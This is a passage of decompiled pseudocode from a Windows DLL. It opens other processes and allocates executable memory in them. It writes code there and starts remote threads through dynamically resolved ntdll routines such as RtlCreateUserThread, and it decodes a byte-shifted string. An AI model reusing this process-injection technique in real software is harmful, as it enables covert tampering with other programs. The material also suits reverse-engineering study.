    v6 = (*(int (__thiscall **)(int))(*(_DWORD *)v16[0] + 12))(v16[0]);
    v7 = sub_100281A2(v6, v18);
    LOBYTE(v20) = 4;
    v8 = sub_1000A959((int)v7, (int)v17);
    LOBYTE(v20) = 3;
    sub_10009F65(v18);
    if ( v8 )
    {
      v10 = *(_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)v16[0] + 12))(v16[0]);
      v11 = -1;
      if ( a2 == 2 )
        goto LABEL_13;
      if ( !ProcessIdToSessionId(v10, &pSessionId) )
        sub_100283EC();
      v11 = pSessionId;
      if ( a2 || v14 == pSessionId )
      {
LABEL_13:
        if ( a3 && v13 != -1 )
        {
          v13 = -1;
          break;
        }
        v13 = v10;
        if ( a2 == 1 && v14 == v11 )
          break;
      }
    }
    sub_100100F8(v9, v16[0]);
  }
  LOBYTE(v20) = 2;
  sub_10011A2D(v16);
  if ( v13 == -1 )
  {
    sub_1000DEEF(&pSessionId);
    _CxxThrowException(&pSessionId, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  LOBYTE(v20) = 0;
  sub_100153B0(v19);
  v20 = -1;
  sub_1000BA51(v17);
  return v13;
}
// 1001ECAF: variable 'v3' is possibly undefined
// 1001EDC0: variable 'v9' is possibly undefined
// 100283EC: using guessed type void __noreturn sub_100283EC(void);
// 1001EC83: using guessed type int var_2C[3];
// 1001EC83: using guessed type _DWORD var_20[5];

//----- (1001EE3A) --------------------------------------------------------
_DWORD *__cdecl sub_1001EE3A(_DWORD *a1, int a2, int a3, char a4, DWORD a5)
{
  int v5; // eax

  v5 = sub_1001EC83(a2, a3, a4);
  sub_1001EE7C(v5, a1, a5);
  return a1;
}

//----- (1001EE7C) --------------------------------------------------------
_DWORD *__usercall sub_1001EE7C@<eax>(DWORD a1@<ebx>, _DWORD *a2, DWORD dwDesiredAccess)
{
  HANDLE v3; // eax
  _DWORD pExceptionObject[7]; // [esp+10h] [ebp-1Ch] BYREF

  pExceptionObject[6] = 0;
  pExceptionObject[3] = 0;
  v3 = OpenProcess(dwDesiredAccess, 0, a1);
  if ( !v3 )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_1001EB43(a2, v3, 0);
  a2[2] = a1;
  return a2;
}

//----- (1001EED7) --------------------------------------------------------
_DWORD *__cdecl sub_1001EED7(_DWORD *a1, int a2, char pExceptionObject)
{
  int *v3; // ecx
  int *v4; // esi
  HANDLE v5; // eax
  int v7; // [esp+10h] [ebp-1Ch] BYREF
  int v8; // [esp+14h] [ebp-18h]
  int v9; // [esp+18h] [ebp-14h]
  LPWSTR FilePart; // [esp+1Ch] [ebp-10h] BYREF
  int v11; // [esp+28h] [ebp-4h]

  v4 = v3;
  v9 = 0;
  sub_10009D9C(260, &v7);
  v11 = 1;
  FilePart = 0;
  if ( pExceptionObject )
  {
    sub_1000A02D(&v7);
    if ( !SearchPathW(0, *(LPCWSTR *)(v4[1] + 12), 0, *(_DWORD *)(v8 + 28), *(LPWSTR *)(v8 + 12), &FilePart) )
    {
      sub_1000DEEF(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
    }
    v4 = &v7;
  }
  v5 = sub_1001AE98(a2, (int)v4);
  sub_1001EB43(a1, v5, 0);
  v9 = 1;
  LOBYTE(v11) = 0;
  sub_10009F65(&v7);
  return a1;
}
// 1001EEE3: variable 'v3' is possibly undefined

//----- (1001EF75) --------------------------------------------------------
_DWORD *__cdecl sub_1001EF75(_DWORD *a1, int a2, int *a3, int a4, char pExceptionObject)
{
  int *v5; // eax
  HANDLE v6; // eax
  int v8; // [esp+10h] [ebp-1Ch] BYREF
  int v9; // [esp+14h] [ebp-18h]
  int v10; // [esp+18h] [ebp-14h]
  LPWSTR FilePart; // [esp+1Ch] [ebp-10h] BYREF
  int v12; // [esp+28h] [ebp-4h]

  v10 = 0;
  sub_10009D9C(260, &v8);
  v12 = 1;
  FilePart = 0;
  if ( pExceptionObject )
  {
    sub_1000A02D(&v8);
    if ( !SearchPathW(0, *(LPCWSTR *)(a3[1] + 12), 0, *(_DWORD *)(v9 + 28), *(LPWSTR *)(v9 + 12), &FilePart) )
    {
      sub_1000DEEF(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
    }
    v5 = &v8;
  }
  else
  {
    v5 = a3;
  }
  v6 = sub_1001AF3E(a4, (int)v5, a2);
  sub_1001EB43(a1, v6, 0);
  v10 = 1;
  LOBYTE(v12) = 0;
  sub_10009F65(&v8);
  return a1;
}

//----- (1001F01D) --------------------------------------------------------
DWORD __thiscall sub_1001F01D(_DWORD *this)
{
  int *p_pExceptionObject; // eax
  int v3; // eax
  _ThrowInfo *v5; // [esp-4h] [ebp-1Ch]
  _DWORD v6[3]; // [esp+4h] [ebp-14h] BYREF
  int pExceptionObject; // [esp+10h] [ebp-8h] BYREF
  DWORD ExitCode; // [esp+14h] [ebp-4h] BYREF

  if ( !sub_10014E39((int)this) )
  {
    sub_1000DEEF(&pExceptionObject);
    v5 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &pExceptionObject;
    goto LABEL_3;
  }
  v3 = this[1];
  ExitCode = 0;
  if ( !GetExitCodeProcess(*(HANDLE *)(v3 + 16), &ExitCode) )
  {
    sub_1000E2E3(v6, 1);
    p_pExceptionObject = v6;
LABEL_3:
    _CxxThrowException(p_pExceptionObject, v5);
  }
  return ExitCode;
}
// 1001F041: variable 'v5' is possibly undefined
// 1001F01D: using guessed type _DWORD var_14[3];

//----- (1001F079) --------------------------------------------------------
int __thiscall sub_1001F079(_DWORD *this)
{
  wchar_t *v2; // eax
  int v3; // ecx
  int v4; // ecx
  int v5; // eax
  int v7; // [esp+4h] [ebp-54h] BYREF
  int v8; // [esp+8h] [ebp-50h]
  int v9[2]; // [esp+Ch] [ebp-4Ch] BYREF
  void *pExceptionObject[7]; // [esp+14h] [ebp-44h] BYREF
  int v11[7]; // [esp+30h] [ebp-28h] BYREF
  int v12; // [esp+54h] [ebp-4h]

  if ( (dword_1009578C & 1) == 0 )
  {
    dword_1009578C |= 1u;
    v12 = 0;
    v2 = (wchar_t *)sub_1000BE16((int)&unk_1008E928);
    v9[0] = v3;
    pExceptionObject[4] = v9;
    sub_10009D2C(v9, v2);
    LOBYTE(v12) = 1;
    v8 = v4;
    v7 = v4;
    pExceptionObject[5] = &v7;
    sub_10009D2C(&v7, aNtdllDll_1);
    LOBYTE(v12) = 0;
    dword_10092404 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_100265E5(v7, v8, v9[0]);
    v12 = -1;
  }
  memset(v11, 0, 0x18u);
  if ( dword_10092404(*(_DWORD *)(this[1] + 16), 0, v11, 24, 0) < 0 )
  {
    v5 = dword_10092404(*(_DWORD *)(this[1] + 16), 0, v11, 24, 0);
    sub_1002CAFE(pExceptionObject, v5);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVEtKqstreari_gfjjefwq_sr__);
  }
  return v11[4];
}
// 1001F0C6: variable 'v3' is possibly undefined
// 1001F0D9: variable 'v4' is possibly undefined
// 10092404: using guessed type int (__stdcall *dword_10092404)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1009578C: using guessed type int dword_1009578C;

//----- (1001F177) --------------------------------------------------------
_DWORD *__thiscall sub_1001F177(_DWORD *this, int a2)
{
  sub_1000DEB4(this, a2);
  *this = &off_10074280;
  this[1] = *(_DWORD *)(a2 + 4);
  return this;
}
// 10074280: using guessed type int (__thiscall *off_10074280)(void *Block, char);

//----- (1001F1AF) --------------------------------------------------------
_DWORD *__thiscall sub_1001F1AF(_DWORD *Block, char a2)
{
  sub_1002CB94(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001F1CE) --------------------------------------------------------
bool __thiscall sub_1001F1CE(_DWORD *this, UINT uExitCode)
{
  BOOL v3; // eax
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  LOBYTE(v3) = sub_10014E39((int)this);
  if ( !v3 )
  {
    v3 = TerminateProcess(*(HANDLE *)(this[1] + 16), uExitCode);
    if ( !v3 )
    {
      sub_1000E2E3(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  return v3;
}
// 1001F1CE: using guessed type _DWORD pExceptionObject[3];

//----- (1001F212) --------------------------------------------------------
_DWORD *__thiscall sub_1001F212(_DWORD *this, _DWORD *a2, int pExceptionObject)
{
  int v3; // edi
  int v4; // ebx
  int v5; // eax
  int v7[3]; // [esp+10h] [ebp-20h] BYREF
  unsigned int v8; // [esp+1Ch] [ebp-14h]
  int v9; // [esp+20h] [ebp-10h]
  int v10; // [esp+2Ch] [ebp-4h]

  v3 = 0;
  v9 = 0;
  v4 = sub_10013422(this);
  sub_100281D7(v7);
  v10 = 1;
  if ( !v8 )
  {
LABEL_4:
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  while ( *(_DWORD *)(*(int (__thiscall **)(int *, int))(v7[0] + 44))(v7, v3) != v4 )
  {
    if ( ++v3 >= v8 )
      goto LABEL_4;
  }
  v5 = (*(int (__thiscall **)(int *, int))(v7[0] + 44))(v7, v3);
  sub_1001EE7C(*(_DWORD *)(v5 + 4), a2, pExceptionObject);
  v9 = 1;
  LOBYTE(v10) = 0;
  sub_100153B0(v7);
  return a2;
}

//----- (1001F2A1) --------------------------------------------------------
_DWORD *__thiscall sub_1001F2A1(_DWORD *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-30h] BYREF
  int v6[3]; // [esp+1Ch] [ebp-24h] BYREF
  int v7; // [esp+28h] [ebp-18h]
  int v8; // [esp+2Ch] [ebp-14h]
  int v9; // [esp+3Ch] [ebp-4h]

  v6[2] = (int)this;
  v8 = 0;
  v9 = 1;
  sub_10009D9C(260, v6);
  LOBYTE(v9) = 2;
  v7 = *(_DWORD *)(this[1] + 16);
  v3 = sub_1000A1E4(v6);
  if ( !GetModuleBaseNameW(v7, 0, v3, 260) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_1000A223((int)v6);
  sub_10009F32(a2, (int)v6);
  v8 = 1;
  LOBYTE(v9) = 1;
  sub_10009F65(v6);
  return a2;
}
// 1001F2A1: using guessed type _DWORD pExceptionObject[3];

//----- (1001F386) --------------------------------------------------------
int __thiscall sub_1001F386(void *this, int a2, int a3, int a4)
{
  sub_10029CE8(a3, (int)this, a2, a4);
  return a2;
}

//----- (1001F3BC) --------------------------------------------------------
int __thiscall sub_1001F3BC(_DWORD *this, int a2, SIZE_T dwSize, DWORD flProtect, DWORD flAllocationType)
{
  int v6; // ecx
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-2Ch] BYREF
  _DWORD v9[3]; // [esp+1Ch] [ebp-20h] BYREF
  int v10; // [esp+28h] [ebp-14h]
  int v11[3]; // [esp+2Ch] [ebp-10h] BYREF
  int v12; // [esp+38h] [ebp-4h]
  LPVOID flProtecta; // [esp+4Ch] [ebp+10h]

  v10 = 0;
  v11[0] = 128;
  sub_10029947((int)v9, v11);
  v12 = 1;
  flProtecta = VirtualAllocEx(*(HANDLE *)(this[1] + 16), 0, dwSize, flAllocationType, flProtect);
  sub_100299F4(v6, (int)v9);
  if ( !flProtecta )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_10029CE8((int)flProtecta, (int)this, a2, dwSize);
  v10 = 1;
  LOBYTE(v12) = 0;
  sub_10029A1B(v9);
  return a2;
}
// 1001F402: variable 'v6' is possibly undefined
// 1001F3BC: using guessed type int var_10[3];
// 1001F3BC: using guessed type _DWORD var_20[3];
// 1001F3BC: using guessed type _DWORD pExceptionObject[3];

//----- (1001F44A) --------------------------------------------------------
int __thiscall sub_1001F44A(void *this, int a2, char a3, char a4, char a5)
{
  sub_1002EFAA((int)this, a2, a3, a4, a5);
  return a2;
}

//----- (1001F4D4) --------------------------------------------------------
char __thiscall sub_1001F4D4(void *this, int *a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  bool v4; // bl
  int v6[5]; // [esp+10h] [ebp-18h] BYREF
  int v7; // [esp+24h] [ebp-4h]

  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  v3 = sub_1001EB76(v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(_DWORD *))(*v3 + 36))(v3) == v2;
  v7 = -1;
  sub_10009696(v6);
  if ( v4 )
    return 0;
  *a2 = sub_1001EC83((int)&unk_100955B8, 0, 1);
  return 1;
}
// 1001F4D4: using guessed type int var_18[5];

//----- (1001F538) --------------------------------------------------------
_DWORD *__cdecl sub_1001F538(_DWORD *a1, int a2, int a3)
{
  int v3; // eax
  int v4; // ecx
  int v5; // edi
  char *v6; // esi
  char *v7; // eax
  _BYTE *v8; // ebx
  _DWORD *result; // eax
  const char *v10; // [esp-10h] [ebp-34h]
  int v11; // [esp-8h] [ebp-2Ch] BYREF
  int v12; // [esp-4h] [ebp-28h]
  void *v13; // [esp+10h] [ebp-14h]
  int v14; // [esp+14h] [ebp-10h]
  int v15; // [esp+20h] [ebp-4h]

  sub_1000C28D((void *)0x40, (int)a1, 0);
  v15 = 0;
  v14 = 1;
  sub_1000C81E(a1);
  v3 = sub_1000C50A(a1);
  v12 = v4;
  v11 = v4;
  v5 = v3;
  v13 = &v11;
  sub_10009D2C(&v11, aKernel32Dll_0);
  v15 = 0;
  v6 = (char *)sub_10026542(v11, v12);
  v13 = &v11;
  sub_10009D2C(&v11, aVirtualfree_1);
  v15 = 0;
  *(_DWORD *)(v5 + 4) = sub_10026590(v6, v11);
  v13 = &v11;
  sub_10009D2C(&v11, aGetprocaddress_0);
  v15 = 0;
  *(_DWORD *)(v5 + 16) = sub_10026590(v6, v11);
  v13 = &v11;
  sub_10009D2C(&v11, aGetmodulehandl_1);
  v15 = 0;
  *(_DWORD *)(v5 + 12) = sub_10026590(v6, v11);
  v13 = &v11;
  sub_10009D2C(&v11, aOpenthread);
  v15 = 0;
  *(_DWORD *)v5 = sub_10026590(v6, v11);
  v13 = &v11;
  sub_10009D2C(&v11, aExitthread);
  v15 = 0;
  v7 = sub_10026590(v6, v11);
  v10 = dword_10091B00;
  *(_DWORD *)(v5 + 8) = v7;
  *(_DWORD *)(v5 + 20) = a2;
  *(_DWORD *)(v5 + 24) = a3;
  strcpy((char *)(v5 + 28), v10);
  strcpy((char *)(v5 + 39), dword_10091AFC);
  if ( strlen((const char *)(v5 + 39)) )
  {
    v8 = (_BYTE *)(v5 + 39);
    do
      --*v8++;
    while ( (unsigned int)&v8[-39 - v5] < strlen((const char *)(v5 + 39)) );
  }
  result = a1;
  *(_BYTE *)(a1[1] + 8) = 1;
  return result;
}
// 1001F571: variable 'v4' is possibly undefined

//----- (1001F6B6) --------------------------------------------------------
_DWORD *__cdecl sub_1001F6B6(_DWORD *a1, char *a2, char *a3)
{
  int v3; // eax
  int v4; // ecx
  char **v5; // edi
  int v7; // [esp-8h] [ebp-30h] BYREF
  int v8; // [esp-4h] [ebp-2Ch]
  void *v9; // [esp+10h] [ebp-18h]
  int v10; // [esp+14h] [ebp-14h]
  void *lp; // [esp+18h] [ebp-10h]
  int v12; // [esp+24h] [ebp-4h]

  sub_1000C28D((void *)0x10, (int)a1, 0);
  v12 = 0;
  v10 = 1;
  sub_1000C81E(a1);
  v3 = sub_1000C50A(a1);
  v8 = v4;
  v7 = v4;
  v5 = (char **)v3;
  lp = &v7;
  sub_10009D2C(&v7, aKernel32Dll_5);
  v12 = 0;
  lp = sub_10026542(v7, v8);
  v9 = &v7;
  sub_10009D2C(&v7, aVirtualfree_2);
  v12 = 0;
  *v5 = sub_10026590((char *)lp, v7);
  v9 = &v7;
  sub_10009D2C(&v7, aExitthread_0);
  v12 = 0;
  v5[1] = sub_10026590((char *)lp, v7);
  v5[2] = a2;
  v5[3] = a3;
  *(_BYTE *)(a1[1] + 8) = 1;
  return a1;
}
// 1001F6ED: variable 'v4' is possibly undefined

//----- (1001F77B) --------------------------------------------------------
_DWORD *__thiscall sub_1001F77B(_DWORD *this, _DWORD *a2, int a3, char *a4, char a5, int Block)
{
  _DWORD *v6; // edi
  void *v7; // esi
  wchar_t *v8; // eax
  int v9; // ecx
  int v10; // ecx
  int v11; // eax
  int *v12; // eax
  int v13; // edi
  wchar_t *v14; // eax
  int v15; // ecx
  int v16; // ecx
  int v17; // edi
  void *v18; // edi
  int v19; // ecx
  _DWORD *v21; // esi
  _DWORD *v22; // ebx
  int v23; // eax
  _DWORD *v24; // eax
  int v25; // eax
  int v26; // ecx
  _DWORD *v27; // esi
  _DWORD *v28; // edi
  void *v29; // ebx
  int v30; // eax
  _ThrowInfo *v31; // ecx
  const _ThrowInfo *v32; // ecx
  int v33; // ebx
  int v34; // ecx
  _DWORD *v35; // esi
  _DWORD *v36; // eax
  _DWORD *v37; // esi
  const _ThrowInfo *v38; // [esp-38h] [ebp-218h] BYREF
  const _ThrowInfo *v39; // [esp-34h] [ebp-214h]
  _ThrowInfo *v40; // [esp-30h] [ebp-210h] BYREF
  _ThrowInfo *v41; // [esp-2Ch] [ebp-20Ch]
  int v42; // [esp-28h] [ebp-208h] BYREF
  char *v43; // [esp-24h] [ebp-204h] BYREF
  int v44; // [esp-20h] [ebp-200h] BYREF
  int v45; // [esp-1Ch] [ebp-1FCh]
  const _ThrowInfo *v46; // [esp-18h] [ebp-1F8h]
  int v47; // [esp-10h] [ebp-1F0h] BYREF
  int v48; // [esp-Ch] [ebp-1ECh]
  int v49[6]; // [esp-8h] [ebp-1E8h] BYREF
  int v50[5]; // [esp+10h] [ebp-1D0h] BYREF
  int v51[5]; // [esp+24h] [ebp-1BCh] BYREF
  int v52[5]; // [esp+38h] [ebp-1A8h] BYREF
  int v53[5]; // [esp+4Ch] [ebp-194h] BYREF
  int v54[5]; // [esp+60h] [ebp-180h] BYREF
  _DWORD v55[2]; // [esp+74h] [ebp-16Ch] BYREF
  _DWORD v56[8]; // [esp+7Ch] [ebp-164h] BYREF
  char v57; // [esp+9Ch] [ebp-144h]
  _DWORD v58[8]; // [esp+A0h] [ebp-140h] BYREF
  int v59; // [esp+C0h] [ebp-120h]
  char v60; // [esp+C8h] [ebp-118h]
  _DWORD pExceptionObject[2]; // [esp+CCh] [ebp-114h] BYREF
  int v62[2]; // [esp+D8h] [ebp-108h] BYREF
  int v63[6]; // [esp+E0h] [ebp-100h] BYREF
  void *v64; // [esp+F8h] [ebp-E8h]
  char v65; // [esp+100h] [ebp-E0h]
  _DWORD v66[2]; // [esp+104h] [ebp-DCh] BYREF
  int v67[6]; // [esp+10Ch] [ebp-D4h] BYREF
  SIZE_T v68; // [esp+124h] [ebp-BCh] BYREF
  HANDLE v69[4]; // [esp+128h] [ebp-B8h] BYREF
  int v70; // [esp+138h] [ebp-A8h] BYREF
  int v71; // [esp+13Ch] [ebp-A4h] BYREF
  int v72; // [esp+140h] [ebp-A0h] BYREF
  int v73; // [esp+144h] [ebp-9Ch] BYREF
  int v74; // [esp+148h] [ebp-98h] BYREF
  int v75[2]; // [esp+14Ch] [ebp-94h] BYREF
  int v76; // [esp+154h] [ebp-8Ch] BYREF
  int v77; // [esp+158h] [ebp-88h] BYREF
  int v78; // [esp+15Ch] [ebp-84h] BYREF
  int v79[3]; // [esp+160h] [ebp-80h] BYREF
  int v80; // [esp+16Ch] [ebp-74h] BYREF
  SIZE_T nSize[2]; // [esp+170h] [ebp-70h] BYREF
  int v82[3]; // [esp+178h] [ebp-68h] BYREF
  int v83[3]; // [esp+184h] [ebp-5Ch] BYREF
  int v84[3]; // [esp+190h] [ebp-50h] BYREF
  int v85[2]; // [esp+19Ch] [ebp-44h] BYREF
  int v86; // [esp+1A4h] [ebp-3Ch]
  int v87[2]; // [esp+1ACh] [ebp-34h] BYREF
  DWORD v88; // [esp+1B4h] [ebp-2Ch] BYREF
  int v89; // [esp+1B8h] [ebp-28h] BYREF
  _DWORD v90[2]; // [esp+1BCh] [ebp-24h] BYREF
  _DWORD *v91; // [esp+1C4h] [ebp-1Ch]
  void *v92; // [esp+1C8h] [ebp-18h]
  void *v93; // [esp+1CCh] [ebp-14h] BYREF
  int v94; // [esp+1DCh] [ebp-4h]

  v6 = this;
  v91 = this;
  v86 = 0;
  v7 = (void *)Block;
  if ( Block )
  {
    if ( (dword_100957A0 & 1) == 0 )
    {
      dword_100957A0 |= 1u;
      v94 = 1;
      v8 = (wchar_t *)sub_1000BE16((int)&unk_1008EB50);
      v49[0] = v9;
      v92 = v49;
      sub_10009D2C(v49, v8);
      LOBYTE(v94) = 2;
      v48 = v10;
      v47 = v10;
      v93 = &v47;
      sub_10009D2C(&v47, aNtdllDll_3);
      LOBYTE(v94) = 1;
      dword_10092414 = (int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_100265E5(v47, v48, v49[0]);
      LOBYTE(v94) = 0;
    }
    memset(v67, 0, sizeof(v67));
    if ( dword_10092414(*(_DWORD *)(v6[1] + 16), 0, v67, 24, 0) < 0 )
    {
      v11 = dword_10092414(*(_DWORD *)(v6[1] + 16), 0, v67, 24, 0);
      sub_1002CAFE(pExceptionObject, v11);
      v41 = (_ThrowInfo *)&_TI2_AVEtKqstreari_gfjjefwq_sr__;
      v12 = pExceptionObject;
      goto LABEL_6;
    }
    v93 = v7;
    while ( 1 )
    {
      sub_1000C28D((void *)0xA4, (int)nSize, 0);
      v94 = 4;
      sub_10029CE8(v67[1], (int)v6, (int)v62, 164);
      LOBYTE(v94) = 5;
      if ( sub_1002A361(v63, nSize) != 164 )
      {
        sub_1000DEEF(&v80);
        v46 = &_TI1_AVSnsziibtx_sr__;
        v12 = &v80;
        goto LABEL_6;
      }
      v13 = sub_1000C52E(nSize);
      if ( *(_DWORD *)(v13 + 12) )
      {
        sub_1000C28D((void *)0x18, (int)&v68, 0);
        LOBYTE(v94) = 6;
        sub_10029CE8(*(_DWORD *)(v13 + 160), (int)v91, (int)v55, 24);
        LOBYTE(v94) = 7;
        if ( sub_1002A361(v56, &v68) != 24 )
        {
          sub_1000DEEF(&v72);
          v46 = &_TI1_AVSnsziibtx_sr__;
          v12 = &v72;
          goto LABEL_6;
        }
        if ( *(_DWORD *)(sub_1000C52E(&v68) + 4) == -1 )
        {
          LOBYTE(v94) = 6;
          sub_10029DE8((int)v55);
          LOBYTE(v94) = 5;
          sub_1000C45D((int *)&v68);
          LOBYTE(v94) = 4;
          sub_10029DE8((int)v62);
          LOBYTE(v94) = 0;
          sub_1000C45D((int *)nSize);
          v6 = v91;
          break;
        }
        LOBYTE(v94) = 6;
        sub_10029DE8((int)v55);
        LOBYTE(v94) = 5;
        sub_1000C45D((int *)&v68);
      }
      Sleep(0xAu);
      v93 = (char *)v93 - 10;
      LOBYTE(v94) = 4;
      sub_10029DE8((int)v62);
      LOBYTE(v94) = 0;
      sub_1000C45D((int *)nSize);
      if ( !v93 && Block != -1 )
      {
        sub_1002C587(&v70);
        v46 = &_TI2_AVBtedofbPwtdhdgkk_bjxssd_sr__;
        v12 = &v70;
        goto LABEL_6;
      }
      v6 = v91;
    }
  }
  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, DWORD *))(*v6 + 76))(v6, &v88) )
  {
    sub_1001EB43(v84, 0, 0);
    v94 = 11;
    sub_10020A83(v66);
    LOBYTE(v94) = 13;
    v21 = sub_1001EE7C(v88, &v89, 0x1F0FFFu);
    LOBYTE(v94) = 14;
    sub_1001287F();
    v84[2] = v21[2];
    LOBYTE(v94) = 13;
    sub_10009696(&v89);
    v94 = 12;
    sub_10029D8C((int)v58);
    LOBYTE(v94) = 22;
    sub_1000F2B5(v83, 0, 0);
    LOBYTE(v94) = 23;
    sub_1000F2B5(v79, 0, 0);
    LOBYTE(v94) = 25;
    sub_10009D2C(v75, &word_1008EC0C);
    LOBYTE(v94) = 26;
    v22 = v91;
    v23 = sub_10013422(v91);
    sub_1000A28F((int)v75, aThPoolShdPqomg, v23);
    v24 = sub_10018A88(v85);
    LOBYTE(v94) = 27;
    sub_10012F8B((int)v69, 17, v75, 1, *(LPSECURITY_ATTRIBUTES *)(*v24 + 4));
    LOBYTE(v94) = 29;
    sub_10003D24(v85);
    sub_10012C8B((int *)v69, v90);
    LOBYTE(v94) = 30;
    sub_10009D2C(v85, &word_1008EC4C);
    LOBYTE(v94) = 31;
    v25 = sub_10013422(v22);
    sub_1000A28F((int)v85, aThPoolShdMtxGm, v25);
    v26 = v45;
    v45 = 1;
    v44 = v26;
    v43 = (char *)v26;
    v92 = &v43;
    sub_10009F32(&v43, (int)v85);
    LOBYTE(v94) = 31;
    sub_10025663(v67, (int)v43, v44, (LPSECURITY_ATTRIBUTES)v45);
    LOBYTE(v94) = 33;
    if ( *(_DWORD *)v67[5] )
    {
      v92 = *(void **)v67[5];
    }
    else
    {
      sub_1000C28D((void *)(&byte_1005BF33 - (char *)sub_1005BF08), (int)v51, sub_1005BF08);
      LOBYTE(v94) = 34;
      v27 = v91;
      (*(void (__thiscall **)(_DWORD *, int *, int, int, int))(*v91 + 44))(v91, v62, v51[3], 64, 4096);
      LOBYTE(v94) = 35;
      v65 = 1;
      sub_1002A148(v62, v51);
      v65 = 0;
      v92 = v64;
      *(_DWORD *)v67[5] = v64;
      v28 = sub_1001EB76(v82);
      LOBYTE(v94) = 36;
      v29 = (void *)v67[3];
      sub_10013422(v27);
      v30 = sub_10013422(v28);
      sub_10025FBF(v29, 0, v30);
      LOBYTE(v94) = 35;
      sub_10009696(v82);
      LOBYTE(v94) = 34;
      sub_10029DE8((int)v62);
      LOBYTE(v94) = 33;
      sub_1000C45D(v51);
      v22 = v91;
    }
    LOBYTE(v94) = 31;
    sub_100256D8(v67);
    LOBYTE(v94) = 30;
    sub_10009F65(v85);
    LOBYTE(v94) = 29;
    sub_10012CBF(v90);
    LOBYTE(v94) = 26;
    sub_100130B8(v69);
    LOBYTE(v94) = 25;
    sub_10009F65(v75);
    sub_1001F6B6(v52, (char *)a3, a4);
    LOBYTE(v94) = 37;
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int, int, int))(*v22 + 44))(v22, v55, v52[3], 64, 4096);
    LOBYTE(v94) = 38;
    v57 = 0;
    sub_1002A148(v55, v52);
    v41 = v31;
    v40 = v31;
    a4 = (char *)&v40;
    sub_10009D2C(&v40, aRtlcreateusert);
    LOBYTE(v94) = 39;
    v39 = v32;
    v38 = v32;
    a3 = (int)&v38;
    sub_10009D2C(&v38, aNtdllDll_4);
    LOBYTE(v94) = 38;
    a4 = sub_100265E5((int)v38, (int)v39, (int)v40);
    Block = 0;
    a3 = 128;
    sub_10029947((int)&v89, &a3);
    LOBYTE(v94) = 41;
    v33 = *(_DWORD *)(v22[1] + 16);
    v41 = (_ThrowInfo *)v87;
    if ( ((int (__cdecl *)(int, _DWORD, int, _DWORD, _DWORD, _DWORD, void *, _DWORD, int *))a4)(
           v33,
           0,
           1,
           0,
           0,
           0,
           v92,
           v56[6],
           &Block) )
    {
      sub_1000DEEF(&v76);
      v12 = &v76;
    }
    else
    {
      sub_100299F4(v34, (int)&v89);
      if ( Block )
      {
        v35 = sub_1000F2B5(v82, (void *)Block, 0);
        LOBYTE(v94) = 42;
        sub_1001287F();
        v83[2] = v35[2];
        LOBYTE(v94) = 41;
        sub_1000F307(v82);
        sub_1001F538(v53, v87[0], v87[1]);
        LOBYTE(v94) = 43;
        sub_1000C28D((void *)(&byte_1005BF07 - (char *)sub_1005BEA2), (int)v50, sub_1005BEA2);
        LOBYTE(v94) = 44;
        sub_1000C6CE(v53, (int)v54, v50);
        LOBYTE(v94) = 45;
        v36 = (_DWORD *)sub_1001F3BC(v84, (int)v62, v54[3], 0x40u, 0x1000u);
        LOBYTE(v94) = 46;
        sub_10029F50((int)v58, v36);
        LOBYTE(v94) = 45;
        sub_10029DE8((int)v62);
        v60 = 1;
        sub_1002A148(v58, v54);
        v93 = 0;
        if ( ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int, int, void **, _DWORD))a4)(
               *(_DWORD *)(v84[1] + 16),
               0,
               0,
               0,
               0,
               0,
               v59 + v53[3],
               v59,
               &v93,
               0) )
        {
          sub_1000DEEF(&v77);
          v12 = &v77;
        }
        else if ( v93 )
        {
          v60 = 0;
          v37 = sub_1000F2B5(v82, v93, 0);
          LOBYTE(v94) = 47;
          sub_1001287F();
          v79[2] = v37[2];
          LOBYTE(v94) = 45;
          sub_1000F307(v82);
          sub_10014CC5((int)v79, 1000, 0);
          v60 = 1;
          if ( a5 || sub_1000F485(v83) )
          {
            LOBYTE(v94) = 44;
            sub_1000C45D(v54);
            LOBYTE(v94) = 43;
            sub_1000C45D(v50);
            LOBYTE(v94) = 41;
            sub_1000C45D(v53);
            LOBYTE(v94) = 38;
            sub_10029A1B(&v89);
            LOBYTE(v94) = 37;
            sub_10029DE8((int)v55);
            LOBYTE(v94) = 25;
            sub_1000C45D(v52);
            v94 = 24;
            sub_1000F58B((int)v83, a2);
            v86 = 1;
            LOBYTE(v94) = 23;
            sub_1000F307(v79);
            LOBYTE(v94) = 22;
            sub_1000F307(v83);
